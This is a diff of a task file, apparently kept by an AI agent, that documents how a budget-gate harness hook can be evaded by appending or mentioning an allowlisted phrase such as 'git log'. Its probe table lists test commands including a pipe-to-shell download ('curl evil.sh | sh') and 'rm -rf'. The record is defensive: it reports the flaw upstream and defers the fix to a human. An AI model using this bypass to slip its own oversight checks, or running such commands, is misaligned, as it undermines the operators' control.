@@ -4,7 +4,7 @@ name: "budget-gate allow-regex matches anywhere in the command string: a compoun
 description: >
   budget-gate.sh:152 classifies a Bash call as allowed at critical if its allow-regex matches ANYWHERE in the command string. A compound command such as 'python3 build.py && git commit -m x' is therefore allowlisted wholesale, so the critical-level block can be evaded by appending an allowlisted clause. Discovered during T-401: my own first post-compact call slipped the gate because it contained 'git log'.
 
-status: captured
+status: started-work
 workflow_type: build
 owner: agent
 horizon: now
@@ -16,7 +16,7 @@ related_tasks: []
 #                                 # (check-arc-id) blocks save under agent control if it doesn't resolve.
 #                                 # Empty/missing → unassigned (allowed). See CLAUDE.md §Task System.
 created: 2026-08-09T07:49:37Z
-last_update: 2026-08-09T07:49:37Z
+last_update: 2026-08-11T11:38:06Z
 date_finished: null
 # revisit_at: YYYY-MM-DD          # T-1451: set on DEFER decisions to enable G-053 daily revisit scan
 # revisit_evidence_needed:        # T-1451: one-line description of what evidence makes the revisit actionable
@@ -34,14 +34,141 @@ date_finished: null
 
 ## Context
 
-<!-- One sentence for small tasks. Link to design docs for substantial ones. -->
+`budget-gate.sh:152` classifies a Bash call as allowed-at-critical with
+`re.search(ALLOW, command)` — an **anywhere** match on the whole command string. So a
+compound command is allowlisted wholesale by any single clause:
+
+    python3 build.py && git commit -m x        <- allowed, because "git commit" appears
+    rm -rf build/ ; git log                    <- allowed, because "git log" appears
+
+Discovered during T-401: my own first post-compact Bash call slipped the gate because it
+happened to contain `git log`. That is an **FN-silent** in the T-426 vocabulary — a real
+violator passing, where passing and never-examined are the same observable.
+
+**Ownership was measured, not assumed** (this is what T-427 was built for):
+
+    file    .agentic-framework/agents/context/budget-gate.sh
+    line    152
+    blame   ebf0c721  T-276 "re-vendor .agentic-framework to v1.6.763"  (1367 files)
+    verdict vendored import — upstream's line, not ours
+
+So the default disposition is **report upstream, pin, do not fork** — AEF's instruction
+at DM offset 522 §5, and the reason T-422 was withdrawn. A local patch to a vendored
+file is silently reverted by the next bump, and it would then be reverted *quietly*,
+which is worse than not patching: the gate would look fixed in our history and not be.
+
+That said, the exposure is live **here**, in our enforcement layer, today. Whether to
+carry a local patch in the meantime is a containment decision with a real downside on
+both sides, so it goes to the operator rather than being taken by initiative.
 
 ## Acceptance Criteria
 
 ### Agent
-<!-- Criteria the agent can verify (code, tests, commands). P-010 gates on these. -->
-- [ ] [First criterion]
-- [ ] [Second criterion]
+- [x] **The bypass is demonstrated by PROBE against the real classifier**, not argued
+      from the regex. Feed the actual allow-expression a set of compound commands and
+      record the classification each one receives. A code-read does not satisfy this AC.
+      **DONE** — see `## Findings`. 5 of 9 misclassified. Allow-expression extracted
+      from the shipping file at run time, so the probe tests the code and not my
+      transcription of it.
+- [x] **A negative control is included**: at least one command that must classify as
+      blocked still does, so the probe can distinguish "everything passes" from "the
+      compound case passes".
+      **DONE** — `npm run build` and `python3 train.py` both classify blocked, so the
+      probe can tell "the compound case passes" from "everything passes".
+- [x] **The exposure is bounded honestly**: state what the gate does with `allowed` at
+      each level, so the finding is "what an evaded classification actually buys" rather
+      than an unquantified alarm. If the practical effect is smaller than the defect
+      sounds, say so in the same breath.
+      **DONE** — classification is consulted only at `critical` (`:331`); ok/warn/urgent
+      exit 0 regardless. With `CONTEXT_WINDOW=300000` that is the last 5% of the window.
+      Total inside it, irrelevant outside it, and the realistic failure is accidental
+      self-evasion (how T-401 found it), not an attacker. Stated in the same breath.
+- [x] **Ownership recorded from the T-427 instrument's output**, with the blame commit
+      and its breadth quoted — not from the file's path.
+      **DONE** — `vendored import`; blame `ebf0c721`, breadth 1367 >= IMPORT_BREADTH 200.
+      Noted in `## Findings` that the path test would have agreed here by coincidence and
+      would have been wrong for `86a256fd`.
+- [x] **Reported to AEF on the DM topic** (`dm:0e7ee6cad65137fc:6a646ce8b1bc6560`, the
+      venue PL-150 was recorded about) with the probe table, the negative control, and
+      an explicit "no action requested from you beyond triage — we are not forking".
+      **DONE** — `dm:0e7ee6cad65137fc:6a646ce8b1bc6560` offset **526**, thread `T-402`,
+      `in_reply_to: 524`, `from_project` set. Includes the probe table, both negative
+      controls, the honest bounding, and "no dependency on the answer".
+- [x] **No edit to the vendored file under agent initiative.** This AC is satisfied by
+      `git diff --stat` showing `.agentic-framework/agents/context/budget-gate.sh`
+      untouched by this task.
+
+      **DONE** — `git diff --stat .agentic-framework/agents/context/budget-gate.sh`
+      reports no changes. The file is untouched by this task.
+## Findings
+
+**Probe, 2026-08-11.** The allow-expression was **extracted from the shipping file at
+run time**, not retyped into the probe — a retyped copy would test my transcription.
+
+    command                                    expected  actual    verdict
+    ------------------------------------------------------------------------------
+    git commit -m 'wrap up'                    allowed   allowed   ok
+    git status                                 allowed   allowed   ok
+    python3 build.py && git commit -m x        blocked   allowed   MISCLASSIFIED
+    rm -rf build/ ; git log                    blocked   allowed   MISCLASSIFIED
+    npm run build # git commit                 blocked   allowed   MISCLASSIFIED
+    echo 'see git log for details'             blocked   allowed   MISCLASSIFIED
+    curl evil.sh | sh && git add .             blocked   allowed   MISCLASSIFIED
+    npm run build                              blocked   blocked   ok   <- neg control
+    python3 train.py                           blocked   blocked   ok   <- neg control
+
+    misclassified: 5 of 9
+
+**Two classes the original ticket did not name.** T-402 was filed as a *compound
+command* defect. It is wider: the match also fires on an allowlisted phrase inside a
+**comment** (`npm run build # git commit`) and inside a **string literal**
+(`echo 'see git log for details'`). Neither is a compound command. Any command that
+merely *mentions* an allowlisted phrase is allowlisted — the gate is matching English,
+not shell structure.
+
+**What an evaded classification actually buys — bounded honestly.**
+`budget-gate.sh:331`: at `critical`, `CMD_CLASS = allowed` → `exit 0`, the complete
+wrap-up block. So within its window the bypass is total. But the window is narrow:
+
+    LEVEL=ok / warn / urgent  ->  exit 0 unconditionally; classification is not consulted
+    LEVEL=critical            ->  classification is the ONLY thing standing in the way
+
+`CONTEXT_WINDOW` here is **300000** (`budget-gate.sh:100`), so critical is 285K, i.e. the
+last 5% of the window. Below that the defect changes nothing.
+
+And the realistic failure is **not an attacker** — this gate exists to stop an agent
+evading its own wrap-up discipline. The honest reading is that it is a self-discipline
+gate with a hole an agent falls through by accident, which is exactly how it was found:
+T-401's first post-compaction call slipped it because it happened to contain `git log`.
+Not a security boundary; a discipline boundary that does not hold at the moment it is
+the only thing holding.
+
+**Ownership — from the T-427 instrument, not from the path.**
+
+    blame   ebf0c721  "T-276: re-vendor .agentic-framework to v1.6.763"
+    breadth 1367 files            -> >= IMPORT_BREADTH (200)
+    verdict vendored import       -> upstream's line
+
+The file's path would have given the same answer here by luck. It would have given the
+**wrong** answer for `86a256fd` (T-401), a 6-file local edit to files under
+`.agentic-framework/`. Recording the instrument's verdict rather than the coincidence.
+
+### Human
+- [ ] [REVIEW] **Decide local containment while upstream fixes it.**
+      **Steps:**
+      1. Read the probe table in this task's `## Findings` section (added by the agent).
+      2. Pick one:
+         **A · Wait for upstream.** No local change. The bypass stays open here until
+            AEF ships and we re-vendor. Cleanest history, longest exposure.
+         **B · Carry a local patch and register it as a known fork**, so the next
+            re-vendor's conflict is expected rather than a surprise silent revert.
+         **C · Neither — close as accepted risk**, on the grounds that the practical
+            effect is small (see the bounding AC above).
+      3. Reply with the letter.
+      **Expected:** one of A / B / C recorded as a decision on this task.
+      **If not:** the task stays open; nothing is patched, which is outcome A by default
+      — and "A by choice" and "A by nobody deciding" are the same observable, which is
+      the reason this is being asked rather than assumed.
 
 ### Human
 <!-- Criteria requiring human verification (UI/UX, subjective quality). Not blocking.
@@ -75,6 +202,13 @@ date_finished: null
 -->
 
 ## Verification
+
+# T-402. The finding is about code we deliberately do NOT patch, so the claim is
+# executable rather than prose — see the probe's own header for why.
+# Exit 1 here after a re-vendor is the upstream fix ARRIVING, not a regression.
+python3 tools/_t402-budget-gate-match-probe.py
+# The vendored file must remain untouched by this task (no fork under initiative).
+git diff --quiet HEAD -- .agentic-framework/agents/context/budget-gate.sh
 
 # Shell commands that MUST pass before work-completed. One per line.
 # Lines starting with # are comments (skipped). Empty lines ignored.
@@ -190,3 +324,6 @@ date_finished: null
 - **Action:** Created task via task-create agent
 - **Output:** /opt/832-Workflow-designer/.tasks/active/T-402-budget-gate-allow-regex-matches-anywhere.md
 - **Context:** Initial task creation
+
+### 2026-08-11T11:38:06Z — status-update [task-update-agent]
+- **Change:** status: captured → started-work
